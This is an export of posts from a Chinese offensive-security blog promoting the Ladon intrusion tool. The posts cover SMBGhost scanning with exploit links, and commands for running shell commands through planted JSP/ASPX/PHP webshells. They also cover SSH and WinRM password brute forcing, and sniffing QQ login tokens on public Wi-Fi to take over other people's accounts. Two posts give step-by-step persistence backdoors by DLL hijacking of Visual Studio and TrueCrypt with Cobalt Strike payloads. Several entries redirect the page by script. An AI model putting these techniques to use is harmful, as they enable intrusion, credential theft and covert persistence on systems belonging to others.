<h4 id="批量检测IP段（-16）SMBGhost漏洞"><a href="#批量检测IP段（-16）SMBGhost漏洞" class="headerlink" title="批量检测IP段（/16）SMBGhost漏洞"></a>批量检测IP段（/16）SMBGhost漏洞</h4><p>ip16.txt里放需要扫描的IP段，使用以下命令即可<br>Ladon SMBGhost</p>
<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/SmbGhost.PNG"></p>
<h3 id="POC-EXP-LPE"><a href="#POC-EXP-LPE" class="headerlink" title="POC/EXP/LPE"></a>POC/EXP/LPE</h3><p><a href="https://github.com/danigargu/CVE-2020-0796" target="_blank" rel="noopener">https://github.com/danigargu/CVE-2020-0796</a><br><a href="https://github.com/chompie1337/SMBGhost_RCE_PoC" target="_blank" rel="noopener">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p>
<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
]]></content>
      <categories>
        <category>提权</category>
        <category>Ladon</category>
        <category>远程执行</category>
      </categories>
      <tags>
        <tag>LPE</tag>
        <tag>RCE</tag>
        <tag>CVE-2020-0796</tag>
        <tag>SMBGhost</tag>
      </tags>
  </entry>
  <entry>
    <title>〖教程〗Ladon连接WebShell一句话远程执行命令</title>
    <url>/p/webshell.html</url>
    <content><![CDATA[<h1 id="在内网渗透中，横向移动用的最多的就是远程执行命令了，网上有很多相关工具，系统也自带相关命令。但不是体积大就是命令繁琐，如schtasks命令等，执行需先创建任务、执行任务、删除任务等，命令长，输错会浪费很多时间，即使复制粘贴也很麻烦。体积大的如Impacket中的psexec-atexec-smbexec-wmiexec等，若是使用PY2-7编译低版本最小也5M左右，最大可能37-5M，无论是内存加载或是传到目标都很麻烦，如果后渗透工具垃圾，区区这几M还未必能传上去，传上去得浪费很多时间。传一个就5M，传4个不得20M-基于以上原因，Ladon添加常用的远程执行命令功能，6-5体积仅844K就包含以上工具功能，扫描到相关密码，即可使用对应模块横向移动，一站式工具，完美一条龙服务。"><a href="#在内网渗透中，横向移动用的最多的就是远程执行命令了，网上有很多相关工具，系统也自带相关命令。但不是体积大就是命令繁琐，如schtasks命令等，执行需先创建任务、执行任务、删除任务等，命令长，输错会浪费很多时间，即使复制粘贴也很麻烦。体积大的如Impacket中的psexec-atexec-smbexec-wmiexec等，若是使用PY2-7编译低版本最小也5M左右，最大可能37-5M，无论是内存加载或是传到目标都很麻烦，如果后渗透工具垃圾，区区这几M还未必能传上去，传上去得浪费很多时间。传一个就5M，传4个不得20M-基于以上原因，Ladon添加常用的远程执行命令功能，6-5体积仅844K就包含以上工具功能，扫描到相关密码，即可使用对应模块横向移动，一站式工具，完美一条龙服务。" class="headerlink" title="在内网渗透中，横向移动用的最多的就是远程执行命令了，网上有很多相关工具，系统也自带相关命令。但不是体积大就是命令繁琐，如schtasks命令等，执行需先创建任务、执行任务、删除任务等，命令长，输错会浪费很多时间，即使复制粘贴也很麻烦。体积大的如Impacket中的psexec/atexec/smbexec/wmiexec等，若是使用PY2.7编译低版本最小也5M左右，最大可能37.5M，无论是内存加载或是传到目标都很麻烦，如果后渗透工具垃圾，区区这几M还未必能传上去，传上去得浪费很多时间。传一个就5M，传4个不得20M?基于以上原因，Ladon添加常用的远程执行命令功能，6.5体积仅844K就包含以上工具功能，扫描到相关密码，即可使用对应模块横向移动，一站式工具，完美一条龙服务。"></a>在内网渗透中，横向移动用的最多的就是远程执行命令了，网上有很多相关工具，系统也自带相关命令。但不是体积大就是命令繁琐，如schtasks命令等，执行需先创建任务、执行任务、删除任务等，命令长，输错会浪费很多时间，即使复制粘贴也很麻烦。体积大的如Impacket中的psexec/atexec/smbexec/wmiexec等，若是使用PY2.7编译低版本最小也5M左右，最大可能37.5M，无论是内存加载或是传到目标都很麻烦，如果后渗透工具垃圾，区区这几M还未必能传上去，传上去得浪费很多时间。传一个就5M，传4个不得20M?基于以上原因，Ladon添加常用的远程执行命令功能，6.5体积仅844K就包含以上工具功能，扫描到相关密码，即可使用对应模块横向移动，一站式工具，完美一条龙服务。</h1><p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
<script language="javascript" type="text/javascript">
window.location.href="http://k8gege.org/Ladon/webshell.html";
</script>


<p><a href="http://k8gege.org/Ladon/webshell.html">http://k8gege.org/Ladon/webshell.html</a></p>
]]></content>
      <categories>
        <category>Ladon</category>
        <category>远程执行</category>
      </categories>
      <tags>
        <tag>WebShell</tag>
        <tag>RCE</tag>
        <tag>ladon</tag>
      </tags>
  </entry>
  <entry>
    <title>Ladon简明教程</title>
    <url>/p/webshell.html</url>
    <content><![CDATA[<p>本文仅是Ladon简单使用例子，Cobalt Strike或PowerShell版用法一致。</p>
<p>完整文档：<a href="http://k8gege.org">http://k8gege.org</a></p>
<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
<script language="javascript" type="text/javascript">
window.location.href="http://k8gege.org/Ladon/example.html";
</script>



]]></content>
      <categories>
        <category>Ladon</category>
      </categories>
      <tags>
        <tag>Ladon</tag>
      </tags>
  </entry>
  <entry>
    <title>〖教程〗Ladon迷你WEB服务器/一键内网HTTP服务器</title>
    <url>/p/webser.html</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>你是否在为配置浏览器漏洞测试环境而烦恼，如配置Apache解析某种MIME测试某个漏洞<br>又或者在为内网机器无WEB又无法通过其它协议传输文件到内网另一台不出网的主机烦恼<br>还有些远程命令不支持多条语句，需要多次写入或HTTP一次性下载过去，显然都会选后者</p>
<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>1.浏览器0day漏洞测试或VPS上一键部署，无需安装配置Apache<br>2.内网HTTP协议文件传输，如内网目标不出网不允许其它协议通过<br>3.Office/Word/Pdf等漏洞或远程下载SCT、HTA等格式的CS Payload<br>4.IP追踪，在邮件里放任意URL，当目标查阅邮件时，可记录访问IP<br>5.系统探测，无论用于XSS或IP追踪都会记录UA，确认目标操作系统</p>
<p>PS：不是非要使用Apache/Ngnix才能复现以上相关漏洞，配置麻烦</p>
<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
<script language="javascript" type="text/javascript">
window.location.href="http://k8gege.org/Ladon/webser.html";
</script>

<p><a href="http://k8gege.org/Ladon/webser.html">http://k8gege.org/Ladon/webser.html</a></p>
]]></content>
      <categories>
        <category>Ladon</category>
      </categories>
      <tags>
        <tag>Ladon</tag>
        <tag>webser</tag>
      </tags>
  </entry>
  <entry>
    <title>〖教程〗Ladon以指定用户权限运行程序或命令</title>
    <url>/p/runas.html</url>
    <content><![CDATA[<h1 id="Ladon内置Runas允许用户用其他权限运行指定的工具和程序。系统自带Runas命令需要交互式登陆，在webshell或不支持交互式的shell下使用麻烦。而Ladon的Runas则完美解决了以上问题，支持非交互式模拟登陆指定用户运行程序或命令。"><a href="#Ladon内置Runas允许用户用其他权限运行指定的工具和程序。系统自带Runas命令需要交互式登陆，在webshell或不支持交互式的shell下使用麻烦。而Ladon的Runas则完美解决了以上问题，支持非交互式模拟登陆指定用户运行程序或命令。" class="headerlink" title="Ladon内置Runas允许用户用其他权限运行指定的工具和程序。系统自带Runas命令需要交互式登陆，在webshell或不支持交互式的shell下使用麻烦。而Ladon的Runas则完美解决了以上问题，支持非交互式模拟登陆指定用户运行程序或命令。"></a>Ladon内置Runas允许用户用其他权限运行指定的工具和程序。系统自带Runas命令需要交互式登陆，在webshell或不支持交互式的shell下使用麻烦。而Ladon的Runas则完美解决了以上问题，支持非交互式模拟登陆指定用户运行程序或命令。</h1><p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
<script language="javascript" type="text/javascript">
window.location.href="http://k8gege.org/Ladon/runas.html";
</script>

<p><a href="http://k8gege.org/Ladon/runas.html">http://k8gege.org/Ladon/runas.html</a></p>
]]></content>
      <categories>
        <category>Ladon</category>
      </categories>
      <tags>
        <tag>Ladon</tag>
        <tag>runas</tag>
      </tags>
  </entry>
  <entry>
    <title>Ladon远程命令执行Wmiexec/psexec/atexec/sshexec/webshell</title>
    <url>/p/winshell.html</url>
    <content><![CDATA[<h1 id="在内网渗透中，横向移动用的最多的就是远程执行命令了，网上有很多相关工具，系统也自带相关命令。但不是体积大就是命令繁琐，如schtasks命令等，执行需先创建任务、执行任务、删除任务等，命令长，输错会浪费很多时间，即使复制粘贴也很麻烦。体积大的如Impacket中的psexec-atexec-smbexec-wmiexec等，若是使用PY2-7编译低版本最小也5M左右，最大可能37-5M，无论是内存加载或是传到目标都很麻烦，如果后渗透工具垃圾，区区这几M还未必能传上去，传上去得浪费很多时间。传一个就5M，传4个不得20M-基于以上原因，Ladon添加常用的远程执行命令功能，6-5体积仅844K就包含以上工具功能，扫描到相关密码，即可使用对应模块横向移动，一站式工具，完美一条龙服务。"><a href="#在内网渗透中，横向移动用的最多的就是远程执行命令了，网上有很多相关工具，系统也自带相关命令。但不是体积大就是命令繁琐，如schtasks命令等，执行需先创建任务、执行任务、删除任务等，命令长，输错会浪费很多时间，即使复制粘贴也很麻烦。体积大的如Impacket中的psexec-atexec-smbexec-wmiexec等，若是使用PY2-7编译低版本最小也5M左右，最大可能37-5M，无论是内存加载或是传到目标都很麻烦，如果后渗透工具垃圾，区区这几M还未必能传上去，传上去得浪费很多时间。传一个就5M，传4个不得20M-基于以上原因，Ladon添加常用的远程执行命令功能，6-5体积仅844K就包含以上工具功能，扫描到相关密码，即可使用对应模块横向移动，一站式工具，完美一条龙服务。" class="headerlink" title="在内网渗透中，横向移动用的最多的就是远程执行命令了，网上有很多相关工具，系统也自带相关命令。但不是体积大就是命令繁琐，如schtasks命令等，执行需先创建任务、执行任务、删除任务等，命令长，输错会浪费很多时间，即使复制粘贴也很麻烦。体积大的如Impacket中的psexec/atexec/smbexec/wmiexec等，若是使用PY2.7编译低版本最小也5M左右，最大可能37.5M，无论是内存加载或是传到目标都很麻烦，如果后渗透工具垃圾，区区这几M还未必能传上去，传上去得浪费很多时间。传一个就5M，传4个不得20M?基于以上原因，Ladon添加常用的远程执行命令功能，6.5体积仅844K就包含以上工具功能，扫描到相关密码，即可使用对应模块横向移动，一站式工具，完美一条龙服务。"></a>在内网渗透中，横向移动用的最多的就是远程执行命令了，网上有很多相关工具，系统也自带相关命令。但不是体积大就是命令繁琐，如schtasks命令等，执行需先创建任务、执行任务、删除任务等，命令长，输错会浪费很多时间，即使复制粘贴也很麻烦。体积大的如Impacket中的psexec/atexec/smbexec/wmiexec等，若是使用PY2.7编译低版本最小也5M左右，最大可能37.5M，无论是内存加载或是传到目标都很麻烦，如果后渗透工具垃圾，区区这几M还未必能传上去，传上去得浪费很多时间。传一个就5M，传4个不得20M?基于以上原因，Ladon添加常用的远程执行命令功能，6.5体积仅844K就包含以上工具功能，扫描到相关密码，即可使用对应模块横向移动，一站式工具，完美一条龙服务。</h1><p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
<script language="javascript" type="text/javascript">
window.location.href="http://k8gege.org/Ladon/WinShell.html";
</script>


<p><a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a></p>
]]></content>
      <categories>
        <category>Ladon</category>
        <category>远程执行</category>
      </categories>
      <tags>
        <tag>Ladon</tag>
        <tag>Rce</tag>
      </tags>
  </entry>
  <entry>
    <title>Winrm远程命令/端口复用后门/WinrmCmd/密码爆破</title>
    <url>/p/winrmscan.html</url>
    <content><![CDATA[<h1 id="WinRM是WindowsRemoteManagementd（win远程管理）的简称。基于Web服务管理-WS-Management-标准，使用80端口或者443端口。这样一来，我们就可以在对方有设置防火墙的情况下远程管理这台服务器了。"><a href="#WinRM是WindowsRemoteManagementd（win远程管理）的简称。基于Web服务管理-WS-Management-标准，使用80端口或者443端口。这样一来，我们就可以在对方有设置防火墙的情况下远程管理这台服务器了。" class="headerlink" title="WinRM是WindowsRemoteManagementd（win远程管理）的简称。基于Web服务管理(WS-Management)标准，使用80端口或者443端口。这样一来，我们就可以在对方有设置防火墙的情况下远程管理这台服务器了。"></a>WinRM是WindowsRemoteManagementd（win远程管理）的简称。基于Web服务管理(WS-Management)标准，使用80端口或者443端口。这样一来，我们就可以在对方有设置防火墙的情况下远程管理这台服务器了。</h1><p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
<script language="javascript" type="text/javascript">
window.location.href="http://k8gege.org/Ladon/WinrmScan.html";
</script>

<p><a href="http://k8gege.org/Ladon/WinrmScan.html">http://k8gege.org/Ladon/WinrmScan.html</a></p>
]]></content>
      <categories>
        <category>Ladon</category>
        <category>远程执行</category>
        <category>密码爆破</category>
      </categories>
      <tags>
        <tag>Ladon</tag>
        <tag>Rce</tag>
        <tag>brute force</tag>
      </tags>
  </entry>
  <entry>
    <title>〖教程〗Ladon网络认证弱口令爆破详解SSH为例</title>
    <url>/p/sshscan.html</url>
    <content><![CDATA[<h1 id="Ladon内置SSH密码爆破SSHscan-支持内外网指定IP、批量IP、批量IP段（C段、B段、A段）、支持CIDR格式，支持自定义SSH端口。支持IP帐密检测-check-txt-，支持帐密组检测-userpass-txt-，支持传统用户密码检测-user-txt、pass-txt-密码爆破前程序会自动检测端口是否开放，无需另外扫描22端口，准备好密码就可以批量爆破。"><a href="#Ladon内置SSH密码爆破SSHscan-支持内外网指定IP、批量IP、批量IP段（C段、B段、A段）、支持CIDR格式，支持自定义SSH端口。支持IP帐密检测-check-txt-，支持帐密组检测-userpass-txt-，支持传统用户密码检测-user-txt、pass-txt-密码爆破前程序会自动检测端口是否开放，无需另外扫描22端口，准备好密码就可以批量爆破。" class="headerlink" title="Ladon内置SSH密码爆破SSHscan,支持内外网指定IP、批量IP、批量IP段（C段、B段、A段）、支持CIDR格式，支持自定义SSH端口。支持IP帐密检测(check.txt)，支持帐密组检测(userpass.txt)，支持传统用户密码检测(user.txt、pass.txt),密码爆破前程序会自动检测端口是否开放，无需另外扫描22端口，准备好密码就可以批量爆破。"></a>Ladon内置SSH密码爆破SSHscan,支持内外网指定IP、批量IP、批量IP段（C段、B段、A段）、支持CIDR格式，支持自定义SSH端口。支持IP帐密检测(check.txt)，支持帐密组检测(userpass.txt)，支持传统用户密码检测(user.txt、pass.txt),密码爆破前程序会自动检测端口是否开放，无需另外扫描22端口，准备好密码就可以批量爆破。</h1><p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
<script language="javascript" type="text/javascript">
window.location.href="http://k8gege.org/Ladon/sshscan.html";
</script>

<p><a href="http://k8gege.org/Ladon/sshscan.html">http://k8gege.org/Ladon/sshscan.html</a></p>
]]></content>
      <categories>
        <category>Ladon</category>
        <category>密码爆破</category>
      </categories>
      <tags>
        <tag>Ladon</tag>
        <tag>brute force</tag>
        <tag>ssh</tag>
      </tags>
  </entry>
  <entry>
    <title>Ladon &amp; Cobalt Strike连接内网WebShell</title>
    <url>/p/ladon_cs_shell.html</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>无论是外网渗透还是内网渗透，为了能够长期控制权限，都会留下各类后门。<br>WebShell无额外进程、无额外端口、不主动向外连接的后门使用频率非常高。<br>外网的有很多管理工具不用说了，但是内网有WebShell机器无法上网怎么办？<br>方案1：代理后管理工具访问，缺点代理卡时，无法连接内网WebShell<br>方案2：使用Ladon，无需代理，只要有SHELL就可以连接内网WebShell</p>
<p>PS: Shell不只限于WebShell，而是任何可执行命令的，含远控、后门</p>
<h3 id="一键GetShell"><a href="#一键GetShell" class="headerlink" title="一键GetShell"></a>一键GetShell</h3><p>使用WebLogicExp模块对内网进行Weblogic漏洞扫描并GetShell<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/WeblogicExp64.PNG"></p>
<p>批量：Ladon 192.168.1.8/24 WeblogicExp</p>
<h3 id="Ladon-JspShell"><a href="#Ladon-JspShell" class="headerlink" title="Ladon JspShell"></a>Ladon JspShell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Usage：Ladon JspShell <span class="built_in">type</span> url <span class="built_in">pwd</span> cmd</span><br><span class="line">Example: Ladon JspShell ua http://192.168.1.8/shell.jsp Ladon whoami</span><br><span class="line">Example: Ladon JspShell <span class="built_in">cd</span> http://192.168.1.8/shell.jsp Ladon whoami</span><br></pre></td></tr></table></figure>

<p>K8-UA马,类型为1或ua（例子WebLogic）<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/JspShellExec.PNG"></p>
<p>菜刀马,类型为2或cd（例子Struts2）<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/JspShell_cd.PNG"></p>
<h3 id="CS-JspShell"><a href="#CS-JspShell" class="headerlink" title="CS JspShell"></a>CS JspShell</h3><p>Cobalt Strike下Ladon连接内网WebShell，用法和在CMD下一模一样</p>
<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/cs/CS_JspShell.PNG"></p>
<h3 id="其它webshell"><a href="#其它webshell" class="headerlink" title="其它webshell"></a>其它webshell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Usage：Ladon WebShell ScriptType ShellType url <span class="built_in">pwd</span> cmd</span><br><span class="line">Example: Ladon WebShell jsp ua http://192.168.1.8/shell.jsp Ladon whoami</span><br><span class="line">Example: Ladon WebShell aspx <span class="built_in">cd</span> http://192.168.1.8/1.aspx Ladon whoami</span><br><span class="line">Example: Ladon WebShell php ua http://192.168.1.8/1.php Ladon whoami</span><br></pre></td></tr></table></figure>

<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>CS: <a href="https://github.com/k8gege/Aggressor" target="_blank" rel="noopener">https://github.com/k8gege/Aggressor</a><br>Ladon: <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
]]></content>
      <categories>
        <category>Ladon</category>
        <category>Cobalt Strike</category>
        <category>远程执行</category>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>Cobalt Strike</tag>
        <tag>WebShell</tag>
      </tags>
  </entry>
  <entry>
    <title>超过8年依然可用的QQkey免密登陆漏洞</title>
    <url>/p/qqkey.html</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>你是否收到好友给你发的H站、赌博等站点的广告信息？没错都是QQKEY的蠕虫，在2012年的时候很疯狂<br>什么QQ空间自动发广告，邮箱自动给好友发广告消息等等，可能你点击里面的广告你的Q也跟着被盗…<br>如果你的号值钱就是以前常说的靓号，盗号者还会改你的信息卖你的QQ，当然现在也就只能发广告了<br>前几年可能也被电信诈骗利用，毕竟能通过资料或好友备注等很多信息，增加诈骗你好友钱的可信度</p>
<h3 id="什么是QQkey"><a href="#什么是QQkey" class="headerlink" title="什么是QQkey"></a>什么是QQkey</h3><p>不管是ClinetKey还是skey在这里我统称它为QQKEY吧，他俩是有区别的，但对于最终目的我们都是登陆。<br>比如说钥匙，长得不一样，售价不一样，开锁难度不一样，但它一样是锁，叫法或卖的价钱不一样而已。</p>
<p>无论是ClinetKey还是skey都是一张临时登陆的身分证，可理解为腾讯对特定字符串（cookie）的定义<br>ClientKey大家有没注意到当你登陆QQ后，访问QQ的相关站点，无需输入QQ密码即可自动登陆相关站点？<br>能自动登陆说明肯定有令牌，总不可能给你存密码，因此我们可以通过特定网页获取到QQKEY免密登陆。</p>
<p>发帖前我又测了一下2014年的QQKEY利用程序，确认依然存在,如QQ邮箱、QQ安全中心均可直接KEY登陆</p>
<p><img alt="image" data-original="http://k8gege.org/k8img/Other/qqkey.gif"></p>
<h3 id="获取内网QQkey"><a href="#获取内网QQkey" class="headerlink" title="获取内网QQkey"></a>获取内网QQkey</h3><p>由于腾讯对QQ做了异地登陆限制，需手机解锁等操作，相对来说也是顶安全的，但在公共场所就不一样了。<br>使用Ladon的HTTP嗅探功能，可轻松嗅探到局域网或公共场所中的QQ和SKEY，比如在网吧、学校、星巴克等<br>在公共场所获取到的QQ肯定是别人当前可登陆的，所以登陆地IP限制就不存在了，嗅到SKEY可直接登陆<br>Ladon获取SKEY的方法非常简单，命令Ladon HttpSniffer 192.168.1.8(本机IP)，坐等即可。<br>该功能在Ladon添加嗅探功能时就有,去年的12月份Ladon 6.0及以后版本均可以</p>
<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/QQskey.png"></p>
<h3 id="QQkey登陆邮箱"><a href="#QQkey登陆邮箱" class="headerlink" title="QQkey登陆邮箱"></a>QQkey登陆邮箱</h3><p><a href="http://ptlogin2.qq.com/jump?clientuin=QQ&amp;clientkey=key&amp;keyindex=9&amp;u1=https%3A%2F%2Fmail.qq.com%2Fcgi-bin%2Flogin%3Fvt%3Dpassport%26vm%3Dwpt%26ft%3Dloginpage%26target%3D&amp;pt_local_tk=&amp;pt_3rd_aid=0&amp;ptopt=1&amp;style=25" target="_blank" rel="noopener">http://ptlogin2.qq.com/jump?clientuin=QQ&amp;clientkey=key&amp;keyindex=9&amp;u1=https%3A%2F%2Fmail.qq.com%2Fcgi-bin%2Flogin%3Fvt%3Dpassport%26vm%3Dwpt%26ft%3Dloginpage%26target%3D&amp;pt_local_tk=&amp;pt_3rd_aid=0&amp;ptopt=1&amp;style=25</a></p>
<p>PS: 其它业务自行抓包获取URL，网上也公开很多ClientKeyt和Skey的利用工具，最新的是今年3月底</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/qq_38837337/article/details/80673809" target="_blank" rel="noopener">https://blog.csdn.net/qq_38837337/article/details/80673809</a></p>
<h3 id="警告"><a href="#警告" class="headerlink" title="警告"></a>警告</h3><p>本文主要是告诉大家不要在使用公共WIFI登陆QQ，其实微信或其它应用也同理</p>
]]></content>
      <categories>
        <category>密码</category>
      </categories>
      <tags>
        <tag>Ladon</tag>
      </tags>
  </entry>
  <entry>
    <title>持久化后门之微软Visual Studio开发工具DLL劫持</title>
    <url>/p/28288.html</url>
    <content><![CDATA[<h3 id="DLL劫持-amp-白加黑"><a href="#DLL劫持-amp-白加黑" class="headerlink" title="DLL劫持&amp;白加黑"></a>DLL劫持&amp;白加黑</h3><p>DLL劫持在白加黑里最常见，07、08年开始在国内才开始起步，但主要是写病毒用到的较多，什么LPK.DLL、USP10.DLL都是当时流行的U盘病毒木马最喜欢用的劫持方式，因为它们可以劫持99%的EXE，10年后渗透圈才开始懂利用，常见的只是单纯用于提权而已。很多人在很多方面不懂举一反三，能执行添加用户命令，你就不懂让它执行远控上线了吗？一定要登3389?</p>
<p>目前还不能完全避免此漏洞，特别是应用软件们的，通过DLL劫持来绕过安全软件主动防御的保护被称为“白加黑”，因为加载的主程序是正常的软件，主动防御可能会放过它，允许它启动，而恶意DLL则通过该软件的漏洞或替换正常的同名文件（对应用软件的文件保护似乎并不象对系统文件保护那样严密，而且并不是一直运行状态，被替换还是比较容易的）， 甚至有的还会冒用合法软件的数字签字等方式，由正常程序加载，从而躲开安全软件的拦截。</p>
<p>当然可能有些人对白加黑有误解，以为非要劫持系统的才叫白加黑，实际APT里最常用的一些方法是，劫持第3方程序。比如360、讯雷、WinRar、Chrome、Office系列等存在DLL劫持，人家给你发送的马包含被劫持程序和对应DLL，运行正常的程序即可绕过主防上线。如海莲花等APT常用WINWORD.EXE加wwwlib.dll方式上线，因为EXE是WORD里的原版程序，有签名又合法它启动，杀软不拦，由于启动时会加载wwwlib.dll（什么C2或CS啊加密存在DLL里，海莲花常用的是CS），它就上线了，这也是白加黑利用。因为并不是所有人都安装WORD，而且安装的版本不定存在这个劫持，所以它必须捆绑EXE在里面，而这个合法的EXE可以是任何第3方程序。</p>
<h3 id="VS劫持"><a href="#VS劫持" class="headerlink" title="VS劫持"></a>VS劫持</h3><p>将K8测试专用DLL劫持工具里的DLL改名成SspiCli.dll后放入VS目录<br>运行VS即可，劫持对象VS2008-VS2015主程序devenv，VS2019已修复<br>其它不只主程序，只是时间太久了，我忘了懒得测，大家自行测试</p>
<h4 id="劫持VS2015"><a href="#劫持VS2015" class="headerlink" title="劫持VS2015"></a>劫持VS2015</h4><p><img alt="image" data-original="http://k8gege.org/k8img/dllhijack/vs2015_ssp.jpg"></p>
<h4 id="劫持VS2012"><a href="#劫持VS2012" class="headerlink" title="劫持VS2012"></a>劫持VS2012</h4><p><img alt="image" data-original="http://k8gege.org/k8img/dllhijack/vs2012_ssp.jpg"></p>
<h4 id="劫持VS2010"><a href="#劫持VS2010" class="headerlink" title="劫持VS2010"></a>劫持VS2010</h4><p><img alt="image" data-original="http://k8gege.org/k8img/dllhijack/vs2010_ssp.jpg"></p>
<h4 id="劫持VS2008"><a href="#劫持VS2008" class="headerlink" title="劫持VS2008"></a>劫持VS2008</h4><p><img alt="image" data-original="http://k8gege.org/k8img/dllhijack/vs2008_ssp.jpg"></p>
<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p><a href="https://github.com/k8gege/K8tools/raw/master/K8dllhijack.rar" target="_blank" rel="noopener">https://github.com/k8gege/K8tools/raw/master/K8dllhijack.rar</a></p>
<h3 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h3><p>如CobalStrike生成DLL改名为SspiCli.dll，用户打开VS时即可上线</p>
<p>PS: 2016年在网易有发过，发现网上已搜不到，重新发一下<br><img alt="image" data-original="http://k8gege.org/k8img/dllhijack/vs_all.jpg"><br>Notepad++ DLL劫持<br><img alt="image" data-original="http://k8gege.org/k8img/dllhijack/notepad++.png"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>Notepad++ 修复被 CIA 利用的 DLL 劫持<br><a href="https://www.sohu.com/a/129080133_466846" target="_blank" rel="noopener">https://www.sohu.com/a/129080133_466846</a><br>[提权]Notepad++ DLL劫持漏洞<br><a href="https://bbs.mayidui.net/t219-e.html" target="_blank" rel="noopener">https://bbs.mayidui.net/t219-e.html</a></p>
<h3 id="扯个淡"><a href="#扯个淡" class="headerlink" title="扯个淡"></a>扯个淡</h3><p>几年前看过我网易博客甚至百度博客的时候会发现，我经过发提权或者DLL劫持的文章，那时候我不需要和别人说持久化人家就懂得如何利用用在哪方面，一张图片就够，而近几年你一定要和人家说一样的名词，不然TMD人家听不懂。不信大家看我19年用博客园时DLL劫持的文章并没多少人看，而以前大家对DLL劫持和提权的关注都是差不多的，这就是最明显的一点。当然也和很多人不会编程或写马有关系，你告诉人家哪个DLL能劫持的，他也没法利用，不关注也很正常。</p>
]]></content>
      <categories>
        <category>持久化</category>
        <category>DLL劫持</category>
      </categories>
      <tags>
        <tag>DllHijack</tag>
      </tags>
  </entry>
  <entry>
    <title>持久化后门之加密工具TrueCrypt DLL劫持</title>
    <url>/p/26141.html</url>
    <content><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>TrueCrypt，是一款免费开源的加密软件，同时支持Windows Vista,7/XP, Mac OS X, Linux 等操作系统。TrueCrypt不需要生成任何文件即可在硬盘上建立虚拟磁盘，用户可以按照盘符进行访问，所有虚拟磁盘上的文件都被自动加密，需要通过密码来进行访问。TrueCrypt 提供多种加密算法，包括：AES-256, Blowfish (448-bit key), CAST5, Serpent, Triple DES, and Twofish，其他特性还有支持FAT32和NTFS分区、隐藏卷标、热键启动等。 </p>
<h3 id="软件荣誉"><a href="#软件荣誉" class="headerlink" title="软件荣誉"></a>软件荣誉</h3><p>FBI在经过一年的尝试后，还是未能破译被巴西执法机构指控金融犯罪的巴西银行家的加密文件。巴西一家葡萄牙语报纸报道（葡萄牙语），巴西联邦警察在2008年7月展开的Satyagraha行动中，在银行家Daniel Dantas位于里约热内卢的公寓内收缴了5个硬盘。文章提到硬盘使用了两种加密程序，一种是TrueCrypt，另一种是不知名的256位AES加密软件。在专家未能破解密码后，巴西政府在2009年初请求美国提供帮助，然而美国联邦警察在一年不成功的尝试后，退还了硬盘。巴西现有的法律中不存在强制要求Dantas交出密码的规定。</p>
<h3 id="TC劫持"><a href="#TC劫持" class="headerlink" title="TC劫持"></a>TC劫持</h3><p>将K8测试专用DLL劫持工具里的DLL改名成RichEd20.dll后放入TC目录<br>运行TrueCrypt目录下的3个EXE均会被劫持，成功弹出被劫持相关信息<br><img alt="image" data-original="http://k8gege.org/k8img/dllhijack/TC_DllHijack.PNG"></p>
<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p><a href="https://github.com/k8gege/K8tools/raw/master/K8dllhijack.rar" target="_blank" rel="noopener">https://github.com/k8gege/K8tools/raw/master/K8dllhijack.rar</a></p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>如CobalStrike生成DLL改名为RichEd20.dll，用户打开TC时即可上线</p>
<p>PS: 2016年在网易有发过，发现网上已搜不到，重新发一下，除了让别人知道，<br>也防止自己未来老年痴呆，被刚入门的利用TC持久化就蛋疼了，因为我喜欢用。<br>他搞你后还来一句，你看这SB这么简单的东西，他天天用都不知道我加了后门</p>
<p>Notepad++ DLL劫持<br><img alt="image" data-original="http://k8gege.org/k8img/dllhijack/notepad++.png"></p>
